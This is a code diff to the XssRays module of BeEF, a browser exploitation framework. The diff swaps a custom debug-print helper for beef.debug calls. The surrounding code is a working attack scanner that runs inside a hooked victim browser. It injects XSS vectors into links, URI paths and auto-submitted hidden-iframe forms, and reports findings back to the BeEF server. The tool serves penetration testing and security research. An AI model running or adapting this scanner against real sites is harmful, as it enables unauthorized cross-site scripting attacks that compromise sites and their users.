@@ -41,9 +41,8 @@ beef.net.xssrays = {
     xssraysScanId : 0,
     hookedBrowserSession: "",
     beefRayUrl: "",
-    // the 3 following variables are overridden via BeEF, in the Scan Config XssRays sub-tab. 
+    // the following variables are overridden via BeEF, in the Scan Config XssRays sub-tab. 
     crossDomain: false,
-    debug:false,
     cleanUpTimeout:5000,
 
     //browser-specific attack vectors available strings: ALL, FF, IE, S, C, O
@@ -98,35 +97,27 @@ beef.net.xssrays = {
             break;
         default : result = false;
         }
-        beef.net.xssrays.printDebug("==== browser_id ==== [" + browser_id + "], result [" + result + "]");
+        beef.debug("==== browser_id ==== [" + browser_id + "], result [" + result + "]");
         return result;
     },
 
-    // util function. Print string to the console only if the debug flag is on and the browser is not IE.
-    printDebug:function(log) {
-        if (this.debug && (!beef.browser.isIE6() && !beef.browser.isIE7() && !beef.browser.isIE8())) {
-            beef.debug("[XssRays] " + log);
-        }
-    },
-
     // main function, where all starts :-)
-    startScan:function(xssraysScanId, hookedBrowserSession, beefUrl, crossDomain, timeout, debug) {
+    startScan:function(xssraysScanId, hookedBrowserSession, beefUrl, crossDomain, timeout) {
 
         this.xssraysScanId = xssraysScanId;
         this.hookedBrowserSession = hookedBrowserSession;
         this.beefRayUrl = beefUrl + '/' + this.handler;
-        beef.net.xssrays.printDebug("Using [" + this.beefRayUrl  + "] handler to contact back BeEF");
+        beef.debug("Using [" + this.beefRayUrl  + "] handler to contact back BeEF");
         this.crossDomain = crossDomain;
         this.cleanUpTimeout = timeout;
-        this.debug = debug;
 
         this.scan();
-        beef.net.xssrays.printDebug("Starting scan");
+        beef.debug("Starting scan");
         this.runJobs();
     },
     complete:function() {
         if (beef.net.xssrays.completed == beef.net.xssrays.totalConnections) {
-            beef.net.xssrays.printDebug("COMPLETE, notifying BeEF for scan id [" + beef.net.xssrays.xssraysScanId + "]");
+            beef.debug("COMPLETE, notifying BeEF for scan id [" + beef.net.xssrays.xssraysScanId + "]");
             $j.get(this.beefRayUrl, { hbsess: this.hookedBrowserSession, raysid: this.xssraysScanId, action: "finish"} );
         } else {
             this.getNextJob();
@@ -134,7 +125,7 @@ beef.net.xssrays = {
     },
     getNextJob:function() {
         var that = this;
-        beef.net.xssrays.printDebug("getNextJob - this.stack.length [" + this.stack.length + "]");
+        beef.debug("getNextJob - this.stack.length [" + this.stack.length + "]");
         if (this.stack.length > 0) {
             var func = that.stack.shift();
             if (func) {
@@ -158,21 +149,19 @@ beef.net.xssrays = {
         return this;
     },
     scanLinks: function() { //TODO: add depth crawling for links that are in the same domain
-        beef.net.xssrays.printDebug("scanLinks, document.links.length [" + document.links.length + "]");
+        beef.debug("scanLinks, document.links.length [" + document.links.length + "]");
         for (var i = 0; i < document.links.length; i++) {
             var url = document.links[i];
 
             if ((url.hostname.toString() === location.hostname.toString() || this.crossDomain) && (location.protocol === 'http:' || location.protocol === 'https:')) {
-                beef.net.xssrays.printDebug("Starting scanning URL [" + url + "]\n url.href => " + url.href +
+                beef.debug("Starting scanning URL [" + url + "]\n url.href => " + url.href +
                     "\n url.pathname => " + url.pathname + "\n" +
                     "url.search => " + url.search + "\n");
                 this.xss({href:url.href, pathname:url.pathname, hostname:url.hostname, port: url.port, protocol: location.protocol,
                     search:url.search, type: 'url'});//scan each link & param
             } else {
-                if (this.debug) {
-                    beef.net.xssrays.printDebug('Scan is not Cross-domain.  URLS\nurl :' + url.hostname.toString());
-                    beef.net.xssrays.printDebug('\nlocation :' + location.hostname.toString());
-                }
+                beef.debug('Scan is not Cross-domain.  URLS\nurl :' + url.hostname.toString());
+                beef.debug('\nlocation :' + location.hostname.toString());
             }
         }
         if (location.search.length > 0) {
@@ -201,7 +190,7 @@ beef.net.xssrays = {
                     for (var i = 0; i < this.vectors.length; i++) {
                         // skip the current vector if it's not compatible with the hooked browser
                         if (!this.checkBrowser(i)){
-                            beef.net.xssrays.printDebug("Skipping vector [" + this.vectors[i].name + "] because it's not compatible with the current browser.");
+                            beef.debug("Skipping vector [" + this.vectors[i].name + "] because it's not compatible with the current browser.");
                             continue;
                         }
                         if (!this.vectors[i].url) {
@@ -209,19 +198,19 @@ beef.net.xssrays = {
                         }
                         if (this.vectors[i].url) {
                             if (target.port == null || target.port == "") {
-                                beef.net.xssrays.printDebug("Starting XSS on GET params of [" + target.href + "], passing url [" + target.protocol + '//' + target.hostname + pathname + "]");
+                                beef.debug("Starting XSS on GET params of [" + target.href + "], passing url [" + target.protocol + '//' + target.hostname + pathname + "]");
                                 this.run(target.protocol + '//' + target.hostname + pathname, 'GET', this.vectors[i], params, true);//params
                             } else {
-                                beef.net.xssrays.printDebug("Starting XSS on GET params of [" + target.href + "], passing url [" + target.protocol + '//' + target.hostname + ':' + target.port + pathname + "]");
+                                beef.debug("Starting XSS on GET params of [" + target.href + "], passing url [" + target.protocol + '//' + target.hostname + ':' + target.port + pathname + "]");
                                 this.run(target.protocol + '//' + target.hostname + ':' + target.port + pathname, 'GET', this.vectors[i], params, true);//params
                             }
                         }
                         if (this.vectors[i].path) {
                             if (target.port == null || target.port == "") {
-                                beef.net.xssrays.printDebug("Starting XSS on URI PATH of [" + target.href + "], passing url [" + target.protocol + '//' + target.hostname + pathname + "]");
+                                beef.debug("Starting XSS on URI PATH of [" + target.href + "], passing url [" + target.protocol + '//' + target.hostname + pathname + "]");
                                 this.run(target.protocol + '//' + target.hostname + pathname, 'GET', this.vectors[i], null, true);//paths
                             } else {
-                                beef.net.xssrays.printDebug("Starting XSS on URI PATH of [" + target.href + "], passing url [" + target.protocol + '//' + target.hostname + ':' + target.port + pathname + "]");
+                                beef.debug("Starting XSS on URI PATH of [" + target.href + "], passing url [" + target.protocol + '//' + target.hostname + ':' + target.port + pathname + "]");
                                 this.run(target.protocol + '//' + target.hostname + ':' + target.port + pathname, 'GET', this.vectors[i], null, true);//paths
                             }
                         }
@@ -244,31 +233,29 @@ beef.net.xssrays = {
 
                         // skip the current vector if it's not compatible with the hooked browser
                         if (!this.checkBrowser(k)){
-                            beef.net.xssrays.printDebug("Skipping vector [" + this.vectors[i].name + "] because it's not compatible with the current browser.");
+                            beef.debug("Skipping vector [" + this.vectors[i].name + "] because it's not compatible with the current browser.");
                             continue;
                         }
                         if (!this.vectors[k].form) {
                             continue;
                         }
                         if (!this.crossDomain && (this.host(action).toString() != this.host(location.toString()))) {
-                            if (this.debug) {
-                                beef.net.xssrays.printDebug('Scan is not Cross-domain. FormPost\naction :' + this.host(action).toString());
-                                beef.net.xssrays.printDebug('location :' + this.host(location));
-                            }
+                            beef.debug('Scan is not Cross-domain. FormPost\naction :' + this.host(action).toString());
+                            beef.debug('location :' + this.host(location));
                             continue;
                         }
                         if (this.vectors[k].form) {
                             if (method === 'GET') {
-                                beef.net.xssrays.printDebug("Starting XSS on FORM action params, GET method of [" + action + "], params [" + paramsstring + "]");
+                                beef.debug("Starting XSS on FORM action params, GET method of [" + action + "], params [" + paramsstring + "]");
                                 this.run(action, method, this.vectors[k], params, true);//params
                             }
                             else {
-                                beef.net.xssrays.printDebug("Starting XSS on FORM action params, POST method of [" + action + "], params [" + paramsstring + "]");
+                                beef.debug("Starting XSS on FORM action params, POST method of [" + action + "], params [" + paramsstring + "]");
                                 this.run(action, method, this.vectors[k], params, false);//params
                             }
                         }
                         if (this.vectors[k].path) {
-                            beef.net.xssrays.printDebug("Starting XSS on FORM action URI PATH of [" + action + "], ");
+                            beef.debug("Starting XSS on FORM action URI PATH of [" + action + "], ");
                             this.run(action, 'GET', this.vectors[k], null, true);//paths
                         }
                     }
@@ -305,11 +292,11 @@ beef.net.xssrays = {
             // this check is needed only when checking for URI path injections
             if(url[url.length - 1] == "/" && params == null){
                url = url.substring(0, url.length - 2);
-               beef.net.xssrays.printDebug("Remove last / from url. New url [" + url + "]");
+               beef.debug("Remove last / from url. New url [" + url + "]");
             }
 
             beef.net.xssrays.uniqueID++;
-            beef.net.xssrays.printDebug('Processing vector [' + vector.name + "], URL [" + url + "]");
+            beef.debug('Processing vector [' + vector.name + "], URL [" + url + "]");
             var poc = '';
             var pocurl = url;
             var exploit = '';
@@ -400,7 +387,7 @@ beef.net.xssrays = {
                     iframe.src = url;
                 }
                 document.body.appendChild(iframe);
-                beef.net.xssrays.printDebug("Creating XSS iFrame with src [" + iframe.src + "], id[" + iframe.id + "], time [" + iframe.time + "]");
+                beef.debug("Creating XSS iFrame with src [" + iframe.src + "], id[" + iframe.id + "], time [" + iframe.time + "]");
             } else if (method === 'POST') {
                 /*
                  * ++++++++++ check for XSS in body parameters (POST) ++++++++++
@@ -410,7 +397,7 @@ beef.net.xssrays = {
                 pocurl = action + "?";
                 paramsPos = 0;
 
-                beef.net.xssrays.printDebug("Form action [" + action + "]");
+                beef.debug("Form action [" + action + "]");
                 for (var i in params) {
                     if (params.hasOwnProperty(i)) {
 
@@ -426,17 +413,17 @@ beef.net.xssrays = {
 
                         exploit = beef.net.xssrays.escape(vector.input.replace(/XSS/g, beefCallback));
                         form += '<textarea name="' + i + '">' + exploit + '<\/textarea>';
-                        beef.net.xssrays.printDebug("form param[" + i + "] = " + params[i].toString());
+                        beef.debug("form param[" + i + "] = " + params[i].toString());
 
                         paramsPos++;
                     }
                 }
                 form += '<\/form>';
                 document.body.appendChild(iframe);
-                beef.net.xssrays.printDebug("Creating form [" + form + "]");
+                beef.debug("Creating form [" + form + "]");
                 iframe.contentWindow.document.writeln(form);
                 iframe.contentWindow.document.writeln('<script>document.createElement("form").submit.apply(document.forms[0]);<\/script>');
-                beef.net.xssrays.printDebug("Submitting form");
+                beef.debug("Submitting form");
             }
 
         });
@@ -452,15 +439,17 @@ beef.net.xssrays = {
             for (var i = 0; i < document.getElementsByTagName('iframe').length; i++) {
                 var iframe = document.getElementsByTagName('iframe')[i];
                 numOfConnections++;
-                //beef.net.xssrays.printDebug("runJobs parseInt(this.timestamp()) [" + parseInt(beef.net.xssrays.timestamp()) + "], parseInt(iframe.time) [" + parseInt(iframe.time) + "]");
+                //beef.debug("runJobs parseInt(this.timestamp()) [" + parseInt(beef.net.xssrays.timestamp()) + "], parseInt(iframe.time) [" + parseInt(iframe.time) + "]");
                 if (parseInt(beef.net.xssrays.timestamp()) - parseInt(iframe.time) > 5) {
                     try{
                         if (iframe) {
                             beef.net.xssrays.complete();
-                            beef.net.xssrays.printDebug("RunJobs cleaning up iFrame [" + iframe.id + "]");
+                            beef.debug("RunJobs cleaning up iFrame [" + iframe.id + "]");
                             document.body.removeChild(iframe);
                         }
-                    }catch(e){beef.net.xssrays.printDebug("Exception [" + e.toString() + "] when cleaning iframes.")}
+                    }catch(e){
+			beef.debug("Exception [" + e.toString() + "] when cleaning iframes.")
+		    }
                 }
             }
 
